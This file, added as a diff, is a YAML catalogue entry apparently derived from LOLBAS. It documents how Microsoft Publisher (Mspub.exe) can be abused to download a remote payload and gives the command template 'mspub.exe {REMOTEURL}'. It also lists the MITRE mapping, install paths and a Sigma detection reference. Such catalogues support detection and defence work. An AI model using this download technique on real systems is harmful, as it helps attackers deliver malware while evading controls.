@@ -1,0 +1,100 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL01zcHViLnltbA/RG93bmxvYWQ/0
+type: binary
+platform: windows
+name: Mspub.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: Suspicious Office application internet/network traffic
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_mspub_download.yml
+commands:
+- template: mspub.exe {REMOTEURL}
+  comment: Downloads payload from remote server
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Mspub/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Mspub.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OtherMSBinaries/Mspub.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Mspub.exe\nDescription: Microsoft Publisher\nAuthor: Nir Chako\nCreated:\
+        \ 2022-08-02\nCommands:\n  - Command: mspub.exe {REMOTEURL}\n    Description: Downloads payload\
+        \ from remote server\n    Usecase: It will download a remote payload and place it in INetCache.\n\
+        \    Category: Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows\
+        \ 10, Windows 11\n    Tags:\n      - Download: INetCache\nFull_Path:\n  - Path: C:\\Program Files\
+        \ (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\MSPUB.exe\n  - Path: C:\\Program Files\\\
+        Microsoft Office 16\\ClientX64\\Root\\Office16\\MSPUB.exe\n  - Path: C:\\Program Files (x86)\\\
+        Microsoft Office\\Office16\\MSPUB.exe\n  - Path: C:\\Program Files\\Microsoft Office\\Office16\\\
+        MSPUB.exe\n  - Path: C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\\
+        MSPUB.exe\n  - Path: C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\MSPUB.exe\n\
+        \  - Path: C:\\Program Files (x86)\\Microsoft Office\\Office15\\MSPUB.exe\n  - Path: C:\\Program\
+        \ Files\\Microsoft Office\\Office15\\MSPUB.exe\n  - Path: C:\\Program Files (x86)\\Microsoft Office\
+        \ 14\\ClientX86\\Root\\Office14\\MSPUB.exe\n  - Path: C:\\Program Files\\Microsoft Office 14\\\
+        ClientX64\\Root\\Office14\\MSPUB.exe\n  - Path: C:\\Program Files (x86)\\Microsoft Office\\Office14\\\
+        MSPUB.exe\n  - Path: C:\\Program Files\\Microsoft Office\\Office14\\MSPUB.exe\nDetection:\n  -\
+        \ Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_mspub_download.yml\n\
+        \  - IOC: Suspicious Office application internet/network traffic\nAcknowledgement:\n  - Person:\
+        \ 'Nir Chako (Pentera)'\n    Handle: '@C_h4ck_0'\n"
+      document_sha256: sha256:12541941fa33085efd546990dad55009b3327ec5aa36179e944672478d5356ef
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Mspub/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:7914bea2c9ba7195bd9d6110b4ec3ac438173922c23ecc67b5e14753426898a3
